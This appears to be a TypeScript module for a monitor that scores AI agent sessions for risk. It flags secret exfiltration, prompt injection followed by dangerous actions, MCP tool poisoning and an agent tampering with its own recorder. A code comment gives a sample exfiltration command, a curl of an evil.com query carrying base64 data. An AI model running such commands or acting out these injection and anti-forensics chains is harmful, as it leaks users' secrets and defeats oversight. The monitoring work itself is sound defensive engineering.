import { isSensitivePath } from './redact-rules';
import {
  armsTamper, commandReadsSensitiveFile, evaluateEvent, isCiBuildPath, isStrongAuthPath, isTestPath, isUntrustedOutputChannel,
  mcpOutboundSensitiveFile, newRuleCtx, PUSH_SENDS, RULESET_VERSION, rulesetNum, rulesFingerprint,
  type FlagId, type RulesetVersion, type SessionRuleCtx,
} from './risk-rules';
import type { RiskRow, SessionRiskRow, Store } from './store';
import type { BlackboxEvent } from './types';

/** The sensitive local file an event reads/writes, if any. Derived from the event
 *  directly (NOT from secret-touch evidence): a real secret read is redacted
 *  (redaction_count>0) and that secret-touch branch carries no path — so relying
 *  on it would leave the tool-poisoning data link empty on exactly the reads that
 *  matter. */
function sensitivePathTouched(e: BlackboxEvent): string | null {
  const t = e.target;
  if (!t) return null;
  if (/^file_(read|write|edit)$/.test(e.action_type)) return isSensitivePath(t) ? t : null;
  if (e.action_type === 'shell_command' || e.action_type === 'git_action') return commandReadsSensitiveFile(t);
  return null;
}

/** Max seq gap for the temporal (non-data-linked) exfil variant to fire (MEDIUM). */
const EXFIL_WINDOW = 20;
/** Max seq gap from an untrusted-channel injection to its dangerous consequent. */
const TAMPER_WINDOW = 20;
/** First-contact tool-poisoning MED (a new server names a sensitive file NEVER
 *  read locally) is designed but DISABLED in v1 — a filesystem MCP reading .env
 *  directly is plausible; deferred until field data bounds its FP rate. */
const POISON_FIRST_CONTACT_MED = false;

export type Verdict = 'none' | 'low' | 'medium' | 'high';
export type ComboId = 'exfil-chain' | 'injected-tamper' | 'injected-exfil' | 'injected-rce' | 'injected-ci-write' | 'tool-poisoning' | 'anti-forensics';

export interface ComboFire {
  id: ComboId;
  severity: 'high' | 'medium';
  antecedent_seq: number;
  consequent_seq: number;
  note: string;
  /** tool-poisoning: the first-seen-this-session server that shipped the file. */
  server?: string;
  /** optional external host evidence (never a firing condition). */
  host?: string;
}

export interface EventRisk {
  seq: number;
  session_id: string;
  score: number;
  flags: FlagId[];
  evidence: Record<string, unknown> | null;
}

export interface SessionVerdict {
  session_id: string;
  verdict: Verdict;
  score: number;
  combos: ComboFire[];
  rule_counts: Record<string, number>;
  last_scored_seq: number;
}

interface SessionState {
  ctx: SessionRuleCtx;
  firstSecretTouchSeq: number | null;
  combos: Map<ComboId, ComboFire>;
  maxEventScore: number;
  ruleCounts: Record<string, number>;
  lastSeq: number;
  // injected-* antecedent (nearest-preceding, provenance-gated)
  lastInjSeq: number | null;
  lastInjPatterns: string[];
  lastInjChannel: string | null;
  // tool-poisoning state
  mcpFirstSeen: Map<string, number>;
  readSensitivePaths: Set<string>;
}

function freshState(): SessionState {
  return {
    ctx: newRuleCtx(), firstSecretTouchSeq: null, combos: new Map(), maxEventScore: 0, ruleCounts: {}, lastSeq: 0,
    lastInjSeq: null, lastInjPatterns: [], lastInjChannel: null, mcpFirstSeen: new Map(), readSensitivePaths: new Set(),
  };
}

function aggregate(state: SessionState): Verdict {
  const combos = [...state.combos.values()];
  const sessionScore = Math.min(100, state.maxEventScore + 40 * combos.length);
  if (combos.some((c) => c.severity === 'high') || sessionScore >= 80) return 'high';
  if (combos.some((c) => c.severity === 'medium') || state.maxEventScore >= 50) return 'medium';
  if (state.maxEventScore > 0) return 'low';
  return 'none';
}

/**
 * Scores events into risk + session verdicts. Pure (no DB): the caller persists.
 * Mirrors the Correlator pattern — per-session in-memory state fed one event at a
 * time, in seq order. `hydrate` rebuilds a session's state from the store the first
 * time it's touched (daemon restart, or ingest into an existing session), so
 * new-mcp-server and combo antecedents survive across process lifetimes.
 */
export class RiskEngine {
  private states = new Map<string, SessionState>();
  private readonly maxSessions = 128;
  /** New (r2) combos are gated on this so an r1 replay is byte-identical. */
  private readonly comboR2: boolean;
  /** r3 anti-forensics combo gate (an r1/r2 replay stays byte-identical). */
  private readonly comboR3: boolean;

  constructor(
    private hydrate?: (sessionId: string) => BlackboxEvent[],
    private ruleset: RulesetVersion = RULESET_VERSION,
  ) {
    this.comboR2 = rulesetNum(this.ruleset) >= 2;
    this.comboR3 = rulesetNum(this.ruleset) >= 3;
  }

  private stateFor(sessionId: string, beforeSeq: number): SessionState {
    let state = this.states.get(sessionId);
    if (state) return state;
    state = freshState();
    if (this.hydrate) {
      for (const prior of this.hydrate(sessionId)) {
        if (prior.seq < beforeSeq) this.ingest(state, prior);
      }
    }
    if (this.states.size >= this.maxSessions) {
      const oldest = this.states.keys().next().value;
      if (oldest !== undefined) this.states.delete(oldest);
    }
    this.states.set(sessionId, state);
    return state;
  }

  /** Fold one event into a session's state; returns its hits + any new combo. */
  private ingest(state: SessionState, e: BlackboxEvent): { hits: ReturnType<typeof evaluateEvent>; fired: ComboFire[] } {
    const hits = evaluateEvent(e, state.ctx, this.ruleset);
    for (const h of hits) {
      state.ruleCounts[h.flag] = (state.ruleCounts[h.flag] ?? 0) + 1;
      if (h.score > state.maxEventScore) state.maxEventScore = h.score;
    }
    if (hits.some((h) => h.flag === 'secret-touch') && state.firstSecretTouchSeq === null) {
      state.firstSecretTouchSeq = e.seq;
    }

    const fired: ComboFire[] = [];
    const send = hits.find((h) => h.flag === 'external-send');
    if (send && !state.combos.has('exfil-chain')) {
      const ev = (send.evidence ?? {}) as { host?: string; secret?: string; via?: string };
      if (ev.secret) {
        // Data-linked: a sensitive FILE is being sent to an external host — the
        // only near-zero-FP signal, so this is the HIGH case. (A redacted auth
        // header on a legit API call is NOT this, and no longer fires.)
        const ante = state.firstSecretTouchSeq !== null && state.firstSecretTouchSeq < e.seq ? state.firstSecretTouchSeq : e.seq;
        const cf: ComboFire = { id: 'exfil-chain', severity: 'high', antecedent_seq: ante, consequent_seq: e.seq, note: 'sensitive file ' + ev.secret + ' sent to ' + (ev.host ?? 'external host') };
        state.combos.set('exfil-chain', cf);
        fired.push(cf);
      } else if (
        state.firstSecretTouchSeq !== null &&
        state.firstSecretTouchSeq < e.seq &&
        e.seq - state.firstSecretTouchSeq <= EXFIL_WINDOW &&
        (PUSH_SENDS as string[]).includes(ev.via ?? '')
      ) {
        // Temporal correlation only (no proof the data flowed) → MEDIUM, not HIGH,
        // and bounded to a short window + a push-type send. Avoids the "read .env
        // then call an API" false alarm.
        const cf: ComboFire = { id: 'exfil-chain', severity: 'medium', antecedent_seq: state.firstSecretTouchSeq, consequent_seq: e.seq, note: 'secret-touch then external send to ' + (ev.host ?? 'external host') + ' (temporal, unverified)' };
        state.combos.set('exfil-chain', cf);
        fired.push(cf);
      }
    }
    // ── r2 combos (gated so an r1 replay stays byte-identical) ─────────────
    if (this.comboR2) {
      // injected-* family: an injection on an UNTRUSTED channel (web_fetch /
      // mcp_call) that ARMS, then a dangerous consequent within TAMPER_WINDOW.
      // Nearest-preceding antecedent (overwrite) maximizes causal proximity.
      const inj = hits.find((h) => h.flag === 'injection-output');
      if (inj && isUntrustedOutputChannel(e)) {
        const patterns = (inj.evidence as { patterns?: string[] } | undefined)?.patterns ?? [];
        if (armsTamper(patterns, e.action_type)) {
          state.lastInjSeq = e.seq;
          state.lastInjPatterns = patterns;
          state.lastInjChannel = e.action_type;
        }
      }
      if (state.lastInjSeq !== null && state.lastInjSeq < e.seq && e.seq - state.lastInjSeq <= TAMPER_WINDOW) {
        const anteSeq = state.lastInjSeq;
        const chan = state.lastInjChannel ?? 'external';
        const pats = state.lastInjPatterns.join(', ');
        const mk = (id: ComboId, severity: 'high' | 'medium', what: string): ComboFire => ({
          id, severity, antecedent_seq: anteSeq, consequent_seq: e.seq,
          note: 'injection-shaped ' + chan + ' output (' + pats + ') then ' + what,
        });
        const authHit = hits.find((h) => h.flag === 'auth-edit');
        const authPath = (authHit?.evidence as { path?: string } | undefined)?.path;
        if (authHit && authPath && isStrongAuthPath(authPath) && !state.combos.has('injected-tamper')) {
          const cf = mk('injected-tamper', isTestPath(authPath) ? 'medium' : 'high', 'auth edit ' + authPath);
          state.combos.set('injected-tamper', cf); fired.push(cf);
        }
        // Any external send after an armed injection — including a query-payload
        // GET (curl evil.com/?d=<base64>) or a remote MCP call, not just PUSH
        // sends. The armed-untrusted-injection antecedent is a strong enough gate.
        const sendHit = hits.find((h) => h.flag === 'external-send');
        const sendEv = (sendHit?.evidence ?? {}) as { via?: string; host?: string };
        if (sendHit && !state.combos.has('injected-exfil')) {
          const cf = mk('injected-exfil', 'high', 'external send (' + (sendEv.via ?? 'send') + ') to ' + (sendEv.host ?? 'external host'));
          state.combos.set('injected-exfil', cf); fired.push(cf);
        }
        if (hits.some((h) => h.flag === 'dangerous-shell') && !state.combos.has('injected-rce')) {
          const cf = mk('injected-rce', 'high', 'dangerous shell command');
          state.combos.set('injected-rce', cf); fired.push(cf);
        }
        if ((e.action_type === 'file_write' || e.action_type === 'file_edit') && e.target && isCiBuildPath(e.target) && !state.combos.has('injected-ci-write')) {
          const cf = mk('injected-ci-write', 'high', 'CI/build-config write ' + e.target);
          state.combos.set('injected-ci-write', cf); fired.push(cf);
        }
      }

      // tool-poisoning: a server first-seen THIS session later ships a sensitive
      // file the session already read (data-linked → near-zero FP, exfil-grade).
      const nmServer = (hits.find((h) => h.flag === 'new-mcp-server')?.evidence as { server?: string } | undefined)?.server;
      if (nmServer) state.mcpFirstSeen.set(nmServer, e.seq);
      if (e.action_type === 'mcp_call' && e.tool_name?.startsWith('mcp__') && !state.combos.has('tool-poisoning')) {
        const server = e.tool_name.split('__')[1] ?? '';
        const first = server ? state.mcpFirstSeen.get(server) : undefined;
        if (first !== undefined && first < e.seq) {
          const outPath = mcpOutboundSensitiveFile(e);
          if (outPath && state.readSensitivePaths.has(outPath)) {
            const host = (hits.find((h) => h.flag === 'external-send')?.evidence as { host?: string } | undefined)?.host;
            const cf: ComboFire = {
              id: 'tool-poisoning', severity: 'high', server, host,
              antecedent_seq: first, consequent_seq: e.seq,
              note: 'new MCP server "' + server + '" shipped sensitive file ' + outPath + (host ? ' to ' + host : ''),
            };
            state.combos.set('tool-poisoning', cf); fired.push(cf);
          } else if (POISON_FIRST_CONTACT_MED && outPath) {
            // first-contact MED tier — intentionally unreachable in v1 (see const).
          }
        }
      }
    }

    // ── r3 combo: anti-forensics — the recorder itself under attack ────────
    // A single recorder-tamper event (already a score-80 HIGH flag) also names
    // itself as a combo, so the verdict panel + case-file surface it explicitly.
    if (this.comboR3 && !state.combos.has('anti-forensics')) {
      const tamper = hits.find((h) => h.flag === 'recorder-tamper');
      if (tamper) {
        const what = (tamper.evidence as { target?: string } | undefined)?.target ?? e.target ?? 'recorder state';
        const cf: ComboFire = { id: 'anti-forensics', severity: 'high', antecedent_seq: e.seq, consequent_seq: e.seq, note: 'the agent attacked the recorder: ' + what };
        state.combos.set('anti-forensics', cf);
        fired.push(cf);
      }
    }

    // Provenance bookkeeping — record sensitive files READ this session for the
    // tool-poisoning data link (AFTER the combo checks so a consequent can never
    // self-satisfy). Derived from the event, not secret-touch evidence — a
    // redacted .env read carries no path on its hit.
    const readPath = sensitivePathTouched(e);
    if (readPath) state.readSensitivePaths.add(readPath);

    state.lastSeq = e.seq;
    return { hits, fired };
  }

  /** Score one event. Returns the event's risk (null if no hits), any newly-fired
   *  combos, and the session's current verdict. Caller persists. */
  score(e: BlackboxEvent): { risk: EventRisk | null; combosFired: ComboFire[]; verdict: SessionVerdict } {
    const state = this.stateFor(e.session_id, e.seq);
    const { hits, fired } = this.ingest(state, e);

    let risk: EventRisk | null = null;
    if (hits.length) {
      const evidence: Record<string, unknown> = {};
      for (const h of hits) if (h.evidence) evidence[h.flag] = h.evidence;
      risk = {
        seq: e.seq,
        session_id: e.session_id,
        score: Math.max(...hits.map((h) => h.score)),
        flags: hits.map((h) => h.flag),
        evidence: Object.keys(evidence).length ? evidence : null,
      };
    }
    return {
      risk,
      combosFired: fired,
      verdict: {
        session_id: e.session_id,
        verdict: aggregate(state),
        score: Math.min(100, state.maxEventScore + 40 * state.combos.size),
        combos: [...state.combos.values()],
        rule_counts: state.ruleCounts,
        last_scored_seq: state.lastSeq,
      },
    };
  }
}

// ---- row converters (engine output → store rows) -------------------------

export function riskRowFrom(r: EventRisk, ruleset: string, now: string): RiskRow {
  return {
    seq: r.seq,
    ruleset_version: ruleset,
    session_id: r.session_id,
    score: r.score,
    flags: JSON.stringify(r.flags),
    evidence: r.evidence ? JSON.stringify(r.evidence) : null,
    computed_at: now,
  };
}

export function sessionRiskRowFrom(v: SessionVerdict, ruleset: string, now: string): SessionRiskRow {
  return {
    session_id: v.session_id,
    ruleset_version: ruleset,
    verdict: v.verdict,
    score: v.score,
    combos: v.combos.length ? JSON.stringify(v.combos) : null,
    rule_counts: JSON.stringify(v.rule_counts),
    last_scored_seq: v.last_scored_seq,
    rules_hash: rulesFingerprint(ruleset as RulesetVersion),
    computed_at: now,
  };
}

// ---- offline drivers (rescore CLI, ingest, startup backfill) -------------

/** Replay a session from the immutable chain and compute its risk WITHOUT writing.
 *  Pure — used by both rescore (then persists) and rescore --check (then diffs). */
export function computeSession(store: Store, sessionId: string, ruleset: RulesetVersion = RULESET_VERSION): { verdict: SessionVerdict; risks: EventRisk[] } {
  const engine = new RiskEngine(undefined, ruleset); // replay explicitly in seq order, no hydrate needed
  const risks: EventRisk[] = [];
  let verdict: SessionVerdict = { session_id: sessionId, verdict: 'none', score: 0, combos: [], rule_counts: {}, last_scored_seq: 0 };
  for (const e of store.eventsLight(sessionId)) {
    const r = engine.score(e);
    if (r.risk) risks.push(r.risk);
    verdict = r.verdict;
  }
  return { verdict, risks };
}

/** Recompute a session's entire risk layer from the immutable chain and persist it.
 *  Never touches events/chain_meta, so verify() is byte-identical before and after. */
export function rescoreSession(store: Store, sessionId: string, ruleset: RulesetVersion = RULESET_VERSION): SessionVerdict {
  const { verdict, risks } = computeSession(store, sessionId, ruleset);
  const now = new Date().toISOString();
  store.riskDelete(ruleset, sessionId);
  for (const r of risks) store.riskUpsert(riskRowFrom(r, ruleset, now));
  store.sessionRiskUpsert(sessionRiskRowFrom(verdict, ruleset, now));
  return verdict;
}

/** Score every session that has no up-to-date verdict for `ruleset`. */
export function backfill(store: Store, ruleset = RULESET_VERSION): { sessions: number; events: number } {
  let sessions = 0;
  let events = 0;
  for (const sid of store.unscoredSessions(ruleset)) {
    try {
      const v = rescoreSession(store, sid, ruleset);
      sessions++;
      events += v.last_scored_seq ? 1 : 0;
    } catch {
      // One bad session must not abort the whole backfill pass.
    }
  }
  return { sessions, events };
}
